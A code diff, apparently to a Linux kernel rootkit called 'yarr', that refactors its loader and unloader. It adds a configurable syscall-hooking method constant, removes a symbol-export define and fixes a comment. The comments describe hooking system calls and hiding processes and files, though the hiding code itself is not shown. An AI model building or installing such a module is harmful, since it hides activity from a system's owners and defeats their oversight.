@@ -41,11 +41,12 @@
 #define MODULE
 #endif
 
-// TODO: Why is yarr exporting everything?.
-#define EXPORT_NO_SYMBOLS
-
 int intr_taken = -1;
 int syscall_taken = -1;
+
+// Yarr offers a variety of methos for hook the system calls, check them at
+// types.h. You can choose one by changing this constant.
+static const int HOOKING_METHOD = HOOK_EACH_SYSCALL;
 
 /***
  * Initializes everything related with interrupts. Yarr tries to install a
@@ -164,7 +165,7 @@ static int __init yarr_loader(void) {
 	// is important. Since YARR modifies syscalls if you initialize anything
 	// after hooking the syscalls and that data can be accessed through
 	// syscalls then a process can call a hooked syscall BEFORE your
-	// initialization has occur. For this reason any init_whatever() function
+	// initialization has occured. For this reason any init_whatever() function
 	// you want to call from here call it BEFORE hook_syscalls().
 
 	// Initialize everything related with hidding processes.
@@ -174,7 +175,7 @@ static int __init yarr_loader(void) {
 	init_hidefile();
 
 	// Hook the system calls.
-	hook_syscalls(HOOK_EACH_SYSCALL);
+	hook_syscalls(HOOKING_METHOD);
 
 	// Install yarrSyscall().
 	init_syscall();
@@ -203,7 +204,7 @@ static void __exit yarr_unloader(void) {
 	}
 
 	// Undo syscall hooks.
-	unhook_syscalls(HOOK_EACH_SYSCALL);
+	unhook_syscalls(HOOKING_METHOD);
 
 	// End hiding files.
 	exit_hidefile();
